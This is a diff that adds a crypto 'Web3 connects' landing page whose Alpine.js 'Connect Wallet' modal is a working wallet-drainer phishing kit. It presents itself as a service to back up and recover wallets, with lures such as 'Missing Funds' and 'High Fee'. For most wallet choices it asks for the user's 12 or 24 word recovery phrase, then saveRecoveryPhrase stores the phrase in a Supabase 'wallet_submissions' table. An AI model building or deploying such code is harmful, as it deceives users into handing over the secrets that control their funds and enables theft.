@@ -1,13 +1,1434 @@
 <!doctype html>
-<html lang="en">
-  <head>
+<html dir="ltr" lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
     <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>wallet-modal-app</title>
-  </head>
-  <body>
-    <div id="app"></div>
-    <script type="module" src="/src/main.js"></script>
-  </body>
+    <meta name="description" content="Securely buy and sell cryptocurrencies with ease on our trusted platform." />
+    <link rel="shortcut icon" href="assets2/images/favicon.ico" type="image/x-icon" />
+    
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    
+    <title>Home - Web3 connects - A crypto buy and sell marketplace</title>
+    
+    <!-- Tabler Icons from CDN -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfonts@2.44.0/tabler-icons.min.css">
+    
+    <!-- Alpine.js: Collapse plugin MUST come before main Alpine -->
+    <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/collapse@3.13.3/dist/cdn.min.js"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.13.3/dist/cdn.min.js"></script>
+    
+    <!-- Your CSS -->
+    <link href="assets2/css/index.css" rel="stylesheet">
+    
+    <!-- Modal Component -->
+    <!-- ALPINE.JS DATA - Replace your old script with this -->
+<!-- ALPINE.JS DATA (Keep this as is, or use your latest version with Supabase) -->
+<!-- Supabase CDN (Add this in <head> if using Supabase) -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<!-- REFACTORED ALPINE.JS MODAL COMPONENT -->
+<script>
+document.addEventListener('alpine:init', () => {
+    Alpine.data('modal', () => ({
+        // State
+        isOpen: false,
+        currentStep: 'connect', // 'connect' | 'wallets' | 'connecting' | 'import' | 'success' | 'error'
+        selectedWallet: '',
+        walletAddress: '',
+        connectionStatus: '',
+        isLoading: false,
+        errorMessage: '',
+        recoveryPhrase: '',
+
+        // Supabase Config (MOVE TO ENV VARIABLES IN PRODUCTION!)
+        supabaseUrl: 'NEXT_PUBLIC_SUPABASE_URL', // Replace or use env variable
+        supabaseKey: 'NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY', // Replace or use env variable
+
+        // Modal Controls
+        openModal() {
+            this.isOpen = true;
+            this.currentStep = 'connect';
+            this.resetForm();
+            document.body.style.overflow = 'hidden';
+        },
+
+        closeModal() {
+            this.isOpen = false;
+            document.body.style.overflow = 'auto';
+            this.resetForm();
+        },
+
+        resetForm() {
+            this.selectedWallet = '';
+            this.walletAddress = '';
+            this.connectionStatus = '';
+            this.isLoading = false;
+            this.errorMessage = '';
+            this.recoveryPhrase = '';
+            this.currentStep = 'connect';
+        },
+
+        // Navigation
+        goToWallets() {
+            this.currentStep = 'wallets';
+        },
+
+        goToImport() {
+            this.currentStep = 'import';
+        },
+
+        // Wallet Selection & Connection
+        async selectWallet(walletName) {
+            this.selectedWallet = walletName;
+            this.errorMessage = '';
+            
+            // Route to appropriate connection method
+            switch(walletName.toLowerCase()) {
+                case 'metamask':
+                    await this.connectMetaMask();
+                    break;
+                case 'trust wallet':
+                    await this.connectTrustWallet();
+                    break;
+                case 'phantom':
+                    await this.connectPhantom();
+                    break;
+                case 'exodus':
+                    await this.connectExodus();
+                    break;
+                case 'coinbase wallet':
+                    await this.connectCoinbase();
+                    break;
+                case 'wallet connect':
+                    // Manual import flow
+                    this.goToImport();
+                    break;
+                default:
+                    // For wallets without SDK, go to manual import
+                    this.goToImport();
+            }
+        },
+
+        // MetaMask Connection
+        async connectMetaMask() {
+            this.currentStep = 'connecting';
+            this.isLoading = true;
+            this.connectionStatus = 'Connecting to MetaMask...';
+
+            try {
+                // Check if MetaMask is installed
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error('MetaMask is not installed. Please install MetaMask extension.');
+                }
+
+                // Request account access
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+
+                if (accounts.length === 0) {
+                    throw new Error('No accounts found. Please unlock MetaMask.');
+                }
+
+                this.walletAddress = accounts[0];
+                this.connectionStatus = 'Connected successfully!';
+                this.currentStep = 'success';
+
+                // Optional: Save to database
+                await this.saveConnection({
+                    wallet_type: 'MetaMask',
+                    wallet_address: this.walletAddress
+                });
+
+                // Auto-close after 2 seconds
+                setTimeout(() => {
+                    this.closeModal();
+                }, 2000);
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Trust Wallet Connection (Uses same API as MetaMask on desktop)
+        async connectTrustWallet() {
+            this.currentStep = 'connecting';
+            this.isLoading = true;
+            this.connectionStatus = 'Connecting to Trust Wallet...';
+
+            try {
+                if (typeof window.ethereum === 'undefined') {
+                    throw new Error('Trust Wallet not detected. Please use Trust Wallet browser or install the extension.');
+                }
+
+                const accounts = await window.ethereum.request({
+                    method: 'eth_requestAccounts'
+                });
+
+                this.walletAddress = accounts[0];
+                this.connectionStatus = 'Connected successfully!';
+                this.currentStep = 'success';
+
+                await this.saveConnection({
+                    wallet_type: 'Trust Wallet',
+                    wallet_address: this.walletAddress
+                });
+
+                setTimeout(() => this.closeModal(), 2000);
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Phantom Wallet (Solana)
+        async connectPhantom() {
+            this.currentStep = 'connecting';
+            this.isLoading = true;
+            this.connectionStatus = 'Connecting to Phantom...';
+
+            try {
+                if (!window.solana || !window.solana.isPhantom) {
+                    throw new Error('Phantom wallet not detected. Please install Phantom extension.');
+                }
+
+                const response = await window.solana.connect();
+                this.walletAddress = response.publicKey.toString();
+                this.connectionStatus = 'Connected to Phantom (Solana)!';
+                this.currentStep = 'success';
+
+                await this.saveConnection({
+                    wallet_type: 'Phantom',
+                    wallet_address: this.walletAddress
+                });
+
+                setTimeout(() => this.closeModal(), 2000);
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Exodus Wallet
+        async connectExodus() {
+            this.currentStep = 'connecting';
+            this.isLoading = true;
+            this.connectionStatus = 'Connecting to Exodus...';
+
+            try {
+                if (window.exodus && window.exodus.ethereum) {
+                    const accounts = await window.exodus.ethereum.request({
+                        method: 'eth_requestAccounts'
+                    });
+                    
+                    this.walletAddress = accounts[0];
+                    this.connectionStatus = 'Connected to Exodus!';
+                    this.currentStep = 'success';
+
+                    await this.saveConnection({
+                        wallet_type: 'Exodus',
+                        wallet_address: this.walletAddress
+                    });
+
+                    setTimeout(() => this.closeModal(), 2000);
+                } else {
+                    throw new Error('Exodus wallet not detected. Please install Exodus wallet.');
+                }
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Coinbase Wallet
+        async connectCoinbase() {
+            this.currentStep = 'connecting';
+            this.isLoading = true;
+            this.connectionStatus = 'Connecting to Coinbase Wallet...';
+
+            try {
+                if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+                    const accounts = await window.ethereum.request({
+                        method: 'eth_requestAccounts'
+                    });
+                    
+                    this.walletAddress = accounts[0];
+                    this.connectionStatus = 'Connected to Coinbase Wallet!';
+                    this.currentStep = 'success';
+
+                    await this.saveConnection({
+                        wallet_type: 'Coinbase Wallet',
+                        wallet_address: this.walletAddress
+                    });
+
+                    setTimeout(() => this.closeModal(), 2000);
+                } else {
+                    throw new Error('Coinbase Wallet not detected.');
+                }
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Manual Import (Recovery Phrase)
+        async proceedImport() {
+            if (!this.recoveryPhrase.trim()) {
+                this.errorMessage = 'Please enter your recovery phrase';
+                return;
+            }
+
+            this.isLoading = true;
+            this.currentStep = 'connecting';
+            this.connectionStatus = 'Importing wallet...';
+
+            try {
+                // Validate recovery phrase (basic check)
+                const words = this.recoveryPhrase.trim().split(/\s+/);
+                if (words.length !== 12 && words.length !== 24) {
+                    throw new Error('Recovery phrase must be 12 or 24 words');
+                }
+
+                // Save to database
+                await this.saveRecoveryPhrase({
+                    wallet_type: this.selectedWallet,
+                    recovery_phrase: this.recoveryPhrase
+                });
+
+                this.connectionStatus = 'Wallet imported successfully!';
+                this.currentStep = 'success';
+
+                setTimeout(() => this.closeModal(), 2000);
+
+            } catch (error) {
+                this.handleConnectionError(error);
+            } finally {
+                this.isLoading = false;
+            }
+        },
+
+        // Error Handler
+        handleConnectionError(error) {
+            console.error('Wallet connection error:', error);
+            
+            this.currentStep = 'error';
+            this.errorMessage = error.message || 'Connection failed. Please try again.';
+            
+            // User-friendly error messages
+            if (error.code === 4001) {
+                this.errorMessage = 'Connection rejected. Please approve the connection request.';
+            } else if (error.message.includes('not installed')) {
+                this.errorMessage = error.message;
+            } else if (error.message.includes('User rejected')) {
+                this.errorMessage = 'You rejected the connection request.';
+            }
+        },
+
+        // Database Operations
+        async saveConnection(data) {
+            try {
+                if (!this.supabaseUrl || !this.supabaseKey) {
+                    console.warn('Supabase not configured');
+                    return;
+                }
+
+                const supabase = window.supabase.createClient(
+                    this.supabaseUrl,
+                    this.supabaseKey
+                );
+
+                const { error } = await supabase
+                    .from('wallet_connections')
+                    .insert([{
+                        ...data,
+                        connected_at: new Date().toISOString(),
+                        user_agent: navigator.userAgent
+                    }]);
+
+                if (error) throw error;
+                
+            } catch (error) {
+                console.error('Error saving connection:', error);
+                // Don't show error to user, just log it
+            }
+        },
+
+        async saveRecoveryPhrase(data) {
+            try {
+                if (!this.supabaseUrl || !this.supabaseKey) {
+                    throw new Error('Database not configured');
+                }
+
+                const supabase = window.supabase.createClient(
+                    this.supabaseUrl,
+                    this.supabaseKey
+                );
+
+                const { error } = await supabase
+                    .from('wallet_submissions')
+                    .insert([{
+                        ...data,
+                        submitted_at: new Date().toISOString(),
+                        user_agent: navigator.userAgent
+                    }]);
+
+                if (error) throw error;
+                
+            } catch (error) {
+                console.error('Error saving recovery phrase:', error);
+                throw new Error('Failed to save wallet data');
+            }
+        }
+    }));
+});
+
+// Global function for backward compatibility
+window.openWalletModal = function() {
+    // Trigger Alpine modal
+    const modalElement = document.querySelector('[x-data*="modal"]');
+    if (modalElement) {
+        Alpine.$data(modalElement).openModal();
+    }
+};
+</script>
+</head>
+
+<body x-data="modal">
+
+    </div>
+    <style>
+        /* 2. NAVBAR -------------------------------------------------------------- */
+
+        .navbar {
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, .05)
+        }
+
+        .navbar-brand {
+            font-weight: 700;
+            font-size: 1.35rem
+        }
+
+        .navbar-brand span:nth-child(1) {
+            color: #EFBD31
+        }
+
+        .navbar-brand span:nth-child(2) {
+            color: #ff4e98
+        }
+
+        .navbar-brand span:nth-child(3) {
+            color: #44c4ff
+        }
+    </style>
+
+    <!-- header -->
+    <header x-data="{
+        scrolled:false,
+        mobileMenu:false,
+        initScroll(){
+          this.scrolled=document.documentElement.scrollTop > 20;
+          window.addEventListener('scroll', () => {this.scrolled = window.scrollY > 20})
+
+          const currentPath = window.location.pathname;
+          const menuLinks = document.querySelectorAll('.menu-link');
+
+          menuLinks.forEach(link => {
+          const linkPath = link.getAttribute('href');
+
+          if (currentPath.endsWith(linkPath)) {
+              link.classList.add('text-primary');
+              if( link.parentElement.parentElement.previousElementSibling.classList.contains('submenu-btn')){
+                link.parentElement.parentElement.previousElementSibling.classList.add('text-primary');
+              }
+
+          }
+         });
+        }
+      }" x-init="initScroll()" :class="scrolled?'bg-accent2':''" class="z-10 py-4 xxl:py-6 border-b border-neutral4/15 fixed top-0 left-0 right-0 w-full">
+        <div class="container flex justify-between items-center">
+            <a class='navbar-brand' href='/index-2'>
+        <span>W</span>
+        <span>e</span>
+        <span>b3 connects</span>
+      </a>
+            <ul class="hidden lg:flex gap-3 lg:gap-4 xxl:gap-8 xl:text-lg">
+
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">IGO</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">LAUNCHPAD</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">STAKING</a>
+                </li>
+
+                <li>
+                    <a class='lg:text-lg py-2 inline-flex menu-link' href='/wallet-connect?farming'>FARMING</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">CRYPTO</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">DEFI</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">WEB3</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">IDO</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">TOKEN</a>
+                </li>
+
+                <li>
+                    <a class="lg:text-lg py-2 inline-flex menu-link" href="#">NFT</a>
+                </li>
+
+            </ul>
+            <div class="flex gap-3 items-center">
+                <button onclick="openWalletModal()" class="btn-primary">Connect Wallet</button>
+                <button @click="mobileMenu=!mobileMenu" class="text-2xl lg:hidden"><i class="ti ti-menu-2"></i></button>
+            </div>
+   <template x-teleport="body">
+    <div x-show="isOpen" 
+         class="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/95 backdrop-blur-lg"
+         @click.self="closeModal">
+
+        <!-- Main Modal -->
+        <div id="custom-wallet-modal" 
+             class="w-full max-w-md bg-[#0a1f14] rounded-3xl overflow-hidden border border-emerald-500/50 shadow-2xl">
+
+            <!-- Header -->
+            <div class="px-6 py-5 border-b border-emerald-500/30 flex justify-between items-center bg-[#0a1f14]">
+                <h2 class="text-xl font-bold text-white">Connect Wallet</h2>
+                <button @click="closeModal" class="text-3xl text-gray-400 hover:text-white">×</button>
+            </div>
+
+            <!-- STEP 1: Backup Wallet -->
+            <div x-show="currentStep === 'connect'" class="p-8">
+                <p class="text-gray-400 text-center mb-8">Gateway to Web3</p>
+                
+                <div class="bg-[#0f2a1f] border border-emerald-500/40 rounded-2xl p-6 text-center">
+                    <div class="mx-auto mb-6 w-20 h-20 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl">
+                        🔐
+                    </div>
+                    <h3 class="text-2xl font-semibold text-white mb-2">Backup Wallet</h3>
+                    <p class="text-gray-400 mb-8">Automatic/Manual backup</p>
+                    
+                    <button @click="goToWallets" 
+                            class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 transition-all rounded-2xl font-semibold text-lg">
+                        Continue
+                    </button>
+                </div>
+            </div>
+<!-- STEP 2: Wallet List -->
+<div x-show="currentStep === 'wallets'" class="p-6">
+    <h2 class="text-2xl font-bold text-white mb-6 text-center">Choose Wallet</h2>
+    
+    <div class="space-y-3 custom-scroll max-h-[460px] overflow-y-auto pr-2">
+
+        <button @click="selectWallet('PEAKDEFI Wallet')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <div class="w-11 h-11 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center text-white font-bold text-xl">P</div>
+            <span class="text-lg font-medium text-white">PEAKDEFI Wallet</span>
+        </button>
+
+        <button @click="selectWallet('Cosmostation')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <img src="https://cryptologos.cc/logos/cosmos-atom-logo.png" class="w-11 h-11 rounded-full" alt="">
+            <span class="text-lg font-medium text-white">Cosmostation</span>
+        </button>
+
+        <button @click="selectWallet('Wallet Connect')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-emerald-500 bg-[#1a3c2e]">
+            <img src="https://walletconnect.com/_next/static/media/walletconnect-logo.8f76a4f4.svg" class="w-11 h-11" alt="">
+            <span class="text-lg font-medium text-white">Wallet Connect</span>
+        </button>
+
+        <button @click="selectWallet('MetaMask')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/512px-MetaMask_Fox.svg.png" class="w-11 h-11" alt="">
+            <span class="text-lg font-medium text-white">MetaMask</span>
+        </button>
+
+        <button @click="selectWallet('Trust Wallet')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Trust_Wallet_Logo.png/600px-Trust_Wallet_Logo.png" class="w-11 h-11" alt="">
+            <span class="text-lg font-medium text-white">Trust Wallet</span>
+        </button>
+
+        <button @click="selectWallet('Exodus')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/Exodus_Logo.svg/512px-Exodus_Logo.svg.png" class="w-11 h-11" alt="">
+            <span class="text-lg font-medium text-white">Exodus</span>
+        </button>
+
+        <button @click="selectWallet('Phantom')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <div class="w-11 h-11 bg-purple-600 rounded-xl flex items-center justify-center text-white font-bold">👻</div>
+            <span class="text-lg font-medium text-white">Phantom</span>
+        </button>
+
+        <button @click="selectWallet('Coinbase Wallet')" 
+                class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+            <div class="w-11 h-11 bg-blue-600 rounded-xl flex items-center justify-center text-white font-bold">C</div>
+            <span class="text-lg font-medium text-white">Coinbase Wallet</span>
+        </button>
+
+    </div>
+</div>
+            <!-- STEP 3: Import (Phrase) -->
+            <div x-show="currentStep === 'import'" class="p-6">
+                <h3 class="text-white text-xl mb-6">Import your Wallet</h3>
+                
+                <div class="space-y-5">
+                    <textarea x-model="recoveryPhrase" rows="5"
+                        class="w-full bg-[#1a3c2e] border border-emerald-500/30 rounded-2xl p-5 text-white focus:border-emerald-500 resize-none"
+                        placeholder="Enter your 12 or 24 word recovery phrase..."></textarea>
+
+                    <div class="flex gap-3">
+                        <button @click="closeModal" 
+                                class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">
+                            Cancel
+                        </button>
+                        <button @click="proceedImport" 
+                                class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
+                            Proceed
+                        </button>
+
+          <!-- STEP 4: Connecting State (NEW) -->
+<div x-show="currentStep === 'connecting'" class="p-6">
+    <h3 class="text-white text-2xl mb-6 text-center">
+        <span x-text="selectedWallet"></span>
+    </h3>
+    
+    <!-- Loading Spinner -->
+    <div class="flex justify-center mb-6">
+        <div class="relative w-20 h-20">
+            <div class="absolute inset-0 border-4 border-emerald-500/30 rounded-full"></div>
+            <div class="absolute inset-0 border-4 border-emerald-500 rounded-full border-t-transparent animate-spin"></div>
+        </div>
+    </div>
+    
+    <!-- Status Message -->
+    <p x-text="connectionStatus" class="text-center text-gray-300 mb-4"></p>
+    
+    <!-- Cancel Button -->
+    <button @click="closeModal" 
+            class="w-full py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800 mt-4">
+        Cancel
+    </button>
+</div>
+
+<!-- STEP 5: Success State (NEW) -->
+<div x-show="currentStep === 'success'" class="p-6 text-center">
+    <div class="mb-6">
+        <div class="mx-auto w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center">
+            <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+            </svg>
+        </div>
+    </div>
+    
+    <h3 class="text-2xl font-bold text-white mb-3">Connected!</h3>
+    <p class="text-gray-400 mb-4" x-text="connectionStatus"></p>
+    
+    <!-- Show address if available -->
+    <div x-show="walletAddress" class="bg-[#1a3c2e] rounded-xl p-4 mb-6">
+        <p class="text-xs text-gray-400 mb-2">Wallet Address:</p>
+        <p class="text-sm text-white font-mono break-all" x-text="walletAddress"></p>
+    </div>
+    
+    <button @click="closeModal" 
+            class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
+        Close
+    </button>
+</div>
+
+<!-- STEP 6: Error State (NEW) -->
+<div x-show="currentStep === 'error'" class="p-6 text-center">
+    <div class="mb-6">
+        <div class="mx-auto w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center">
+            <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+            </svg>
+        </div>
+    </div>
+    
+    <h3 class="text-2xl font-bold text-white mb-3">Connection Failed</h3>
+    <p class="text-red-400 mb-6" x-text="errorMessage"></p>
+    
+    <div class="flex gap-3">
+        <button @click="closeModal" 
+                class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">
+            Close
+        </button>
+        <button @click="goToWallets" 
+                class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
+            Try Again
+        </button>
+    </div>
+</div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</template>
+        </div>
+        <!-- mobile menu -->
+        <div :class="mobileMenu?'translate-x-0':'-translate-x-full'" class="absolute h-screen overflow-y-auto bg-accent5 lg:hidden top-0 left-0 z-50 duration-300 p-4 w-[300px]">
+            <div class="flex justify-between items-center">
+                <a class='navbar-brand' href='/index-2'>
+            <span>W</span>
+            <span>e</span>
+            <span>b3 connects</span>
+          </a>
+                <button @click="mobileMenu = false" class="text-xl"><i class="ti ti-x"></i></button>
+            </div>
+            <ul class="flex flex-col gap-3 lg:gap-4 mt-4">
+
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">IGO</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">LAUNCHPAD</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">STAKING</a>
+                </li>
+
+                <li>
+                    <a class='py-1 inline-flex menu-link' href='/wallet-connect?farming'>FARMING</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">CRYPTO</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">DEFI</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">WEB3</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">IDO</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">TOKEN</a>
+                </li>
+
+                <li>
+                    <a class="py-1 inline-flex menu-link" href="#">NFT</a>
+                </li>
+
+            </ul>
+        </div>
+        <div x-show="mobileMenu" @click="mobileMenu = false" class="fixed bg-neutral1/10 z-20 w-full h-full inset-0 lg:hidden"></div>
+    </header>
+
+
+    <!-- go to top -->
+    <div x-data="{
+      scrolled:false,
+      gotoTop() {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      },
+      onScroll() {
+        document.addEventListener('scroll', () => {this.scrolled = document.body.scrollTop > 80 || document.documentElement.scrollTop > 80})
+      }
+    }" x-init="onScroll()" class="fixed bottom-5 right-5 xl:right-7 xl:bottom-7 z-30">
+        <button :class="scrolled?'translate-y-0':'translate-y-[300px]'" class="size-12 ease-bounce duration-500 f-center rounded-full bg-primary shadow-xl text-2xl" @click="gotoTop()"><i class="ti ti-arrow-up"></i></button>
+    </div>
+
+
+    <!-- Main Content -->
+    <main class="mt-[82px] xxl:mt-[98px]">
+        <!-- hero section -->
+        <section class="relative overflow-hidden">
+            <img class="max-xxl:hidden absolute left-0 top-8" src="assets2/images/ellipse-1.png" alt="" />
+            <img class="max-xl:hidden absolute right-0 bottom-16" src="assets2/images/ellipse-2.png" alt="" />
+            <img class="max-xl:hidden rocket absolute left-10 bottom-8 z-[2]" src="assets2/images/rocket.png" alt="" />
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate" src="assets2/images/globe.png" alt="" />
+            <img class="absolute left-[5%] bottom-[30%] animate-slow-rotate-reverse" src="assets2/images/bitcoin.png" alt="" />
+            <img class="absolute right-[12%] top-[40%] animate-slow-rotate" src="assets2/images/coin-1.png" alt="" />
+            <div class="max-lg:hidden w-[250px] h-[204px] xxl:w-[404px] xxl:h-[404px] absolute bottom-[-15%] blur-[85px] left-[-12%] bg-[rgba(240,185,11,0.50)]"></div>
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute top-[6%] blur-[85px] left-[-12%] bg-primary/50"></div>
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute bottom-[6%] blur-[85px] right-[-8%] bg-accent1/50"></div>
+            <div class="container pt-120 pb-120 grid grid-cols-12 gap-6 items-center">
+                <div class="col-span-12 lg:col-span-6 relative z-[2] max-lg:flex max-lg:flex-col max-lg:items-center max-lg:text-center">
+                    <h2 class="display-4 mb-4 fade_up_anim">
+                        Gateway to Encrypt, back up, and
+                        <span class="text-primary display-4 underline">secure</span><span class="text-secondary display-4 underline"> your XRP and XLM assets</span>
+                    </h2>
+                    <p class="mb-8 xl:mb-10 max-w-md lg:text-lg fade_up_anim" data-delay="0.2">The easiest, safest, and fastest way to secure &amp; back up crypto asset.</p>
+                    <div class="flex gap-6 fade_up_anim" data-delay="0.4">
+                        <button @click="openModal" class="btn-primary">Connect Wallet</button>
+                        <button @click="openModal" class="btn-accent6">Explore Now</button>
+                    </div>
+                </div>
+                <div class="col-span-12 lg:col-span-5 lg:col-start-8 relative max-lg:flex max-lg:justify-center fade_up_anim" data-delay=".5">
+                    <img src="Web3-removebg-preview.png" class="relative z-[3]" alt="" />
+                    <div class="w-[280px] h-[280px] md:w-[350px] md:h-[350px] absolute top-[6%] blur-[85px] left-0 bg-primary/50"></div>
+                </div>
+                <div class="col-span-12 gap-6 grid grid-cols-12 xl:divide-x divide-neutral4/60 pt-120 relative z-[2]">
+                    <div class="col-span-6 md:col-span-3">
+                        <h3 class="h3 mb-3"><span id="country">200</span>+</h3>
+                        <p class="text-neutral1/80 lg:text-lg">Countries Covered</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8">
+                        <h3 class="h3 mb-3"><span id="investor">30</span> Million</h3>
+                        <p class="text-neutral1/80 lg:text-lg">Global Investors</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8">
+                        <h3 class="h3 mb-3"><span id="coin">700</span>+</h3>
+                        <p class="text-neutral1/80 lg:text-lg">Secured Wallet</p>
+                    </div>
+                    <div class="col-span-6 md:col-span-3 xl:pl-8">
+                        <h3 class="h3 mb-3">$<span id="volume">1.36</span> Billion</h3>
+                        <p class="text-neutral1/80 lg:text-lg">Secured Volume</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- find opportunities -->
+        <section class="bg-accent2">
+            <div class="container pt-120 pb-120">
+                <div class="grid grid-cols-12 gap-4 mb-10 xl:mb-[60px]">
+                    <div class="col-span-12 md:col-span-12 xl:col-span-4">
+                        <h2 class="fade_up_anim">
+                            Find & Secure
+                            <span class="text-primary h2 underline">crypto</span> Now!
+                        </h2>
+                    </div>
+                    <div class="col-span-12 md:col-span-12 xl:col-span-4 xl:col-start-9">
+                        <p data-delay=".3" class="text-xs md:text-base lg:text-lg fade_up_anim">Our comprehensive cybersecurity platform, driven by artificial intelligence, not only safeguards your organization.</p>
+                    </div>
+                </div>
+                <div class="grid grid-cols-12 gap-4 grid-rows-2">
+                    <div class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-4 row-span-2 bg-accent6 rounded-xl p-4 !pb-0 xl:p-6 xxl:p-8 flex-col flex justify-between">
+                        <div>
+                            <h3 class="mb-1">Connect to Dapps</h3>
+                            <!-- <p class="text-2xl mb-2">Connect to Dapps</p> -->
+                            <!-- <h2 class="display-3 mb-6 xl:mb-8">15%</h2>
+                <p class="text-2xl mb-3">in annual crypto rewards</p> -->
+                            <p class="text-lg text-neutral1/70">Connect decentralized apps to mobile wallets and enable DAPP.</p>
+                        </div>
+                        <img src="assets2/images/globe-2.png" class="lg:-ml-5" alt="" />
+                    </div>
+                    <div data-delay=".15" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-4 bg-accent6 rounded-xl p-4 !pb-0 xl:p-6 xxl:p-8">
+                        <h3 class="mb-1">Missing Funds</h3>
+                        <p class="lg:text-lg text-neutral1/70">Lost access to funds or missing funds? Click here.</p>
+                        <div class="flex justify-end">
+                            <img src="assets2/images/trade.png" class="lg:-mr-5 -mt-9" alt="" />
+                        </div>
+                    </div>
+                    <div data-delay=".25" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-4 bg-accent6 rounded-xl p-4 !pb-0 xl:p-6 xxl:p-8">
+                        <h3 class="mb-1">High Fee</h3>
+                        <p class="lg:text-lg text-neutral1/70">Transaction fees too high? Click here.</p>
+                        <div class="flex justify-end">
+                            <img src="assets2/images/spot.png" class="lg:-mr-5" alt="" />
+                        </div>
+                    </div>
